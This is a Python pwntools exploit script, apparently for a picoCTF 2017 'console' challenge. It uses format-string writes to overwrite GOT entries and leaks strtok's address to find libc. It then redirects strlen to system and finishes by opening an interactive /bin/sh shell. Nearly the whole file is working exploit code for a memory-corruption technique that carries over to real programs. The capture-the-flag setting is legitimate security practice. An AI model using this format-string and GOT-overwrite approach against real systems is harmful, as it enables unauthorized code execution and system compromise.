from pwn import *

# see from readelf -s <lib>
STRTOK_OFFSET = 0x08a530
SYSTEM_OFFSET = 0x045380

STRTOK_OFFSET = 0x084a60
SYSTEM_OFFSET = 0x041490

prog = ["./console", "log"]
LOOP = 0x004009bd
#LOOP = 0x7f13d5851000
GOT_EXIT = 0x601258
GOT_STRTOK = 0x601250
GOT_STRLEN = 0x601210

p = process(executable=prog[0], argv=prog, env={'LD_PRELOAD': './libc.so.6.remote'})
# p = remote('shell2017.picoctf.com', 46394)

def write(val, addr):
    # write 4 bytes in 2 parts
    v1 = val & 0xffff
    v2 = 0x10000 + (val >> 16)
    s = b"e AAAAAA%{:0>8}x%19$hn%{:0>8}x%20$hn"
    s = s.format(v1 - 6, v2 - v1) + p64(addr) + p64(addr+2)
    p.sendline(s)

def _write(val, addr):
    val = "{}".format(val - 8).zfill(15)
    s = b"e AAAAAAAA%{}x%18$n".format(val) + p64(addr)
    p.sendline(s)
    # p.recvuntil('AAAAAA')

# LEAK_STRTOK = b"e AAAAAAA:%00000x|%17$s|\x50\x12\x60\x00\x00\x00\x00\x00"
def read(addr):
    p.sendline(b"e AAAAAAA:%00000x|%17$s|" + p64(addr))
    p.recvuntil('AAAAAA')
    p.recvuntil('|')
    _addr = p.recvuntil('|')[:-1]
    return u64(_addr.ljust(8, '\x00'))


#gdb.attach(p, "watch (long *)*0x601210\nc\n")
GDB = """
watch (long *)*0x601258
watch (long *)*0x601210
b *0x4009a8
c
"""
gdb.attach(p, GDB)
write(LOOP, GOT_EXIT)
strtok_addr = read(GOT_STRTOK)

baseaddr = strtok_addr - STRTOK_OFFSET
system_addr = baseaddr + SYSTEM_OFFSET

info("strtok : " + hex(strtok_addr))
info("libc   : " + hex(baseaddr))
info("system : " + hex(system_addr))
info("writing: " + hex(system_addr & 0xffffffff))
p.sendline("p lol")
p.recvuntil("lol")
write(system_addr & 0xffffffff, GOT_STRLEN)
p.recvuntil('AAAAA')
p.recvuntil('Config action: ')
p.sendline("p /bin/sh")
print("Enjoy your shell :)")
p.interactive()

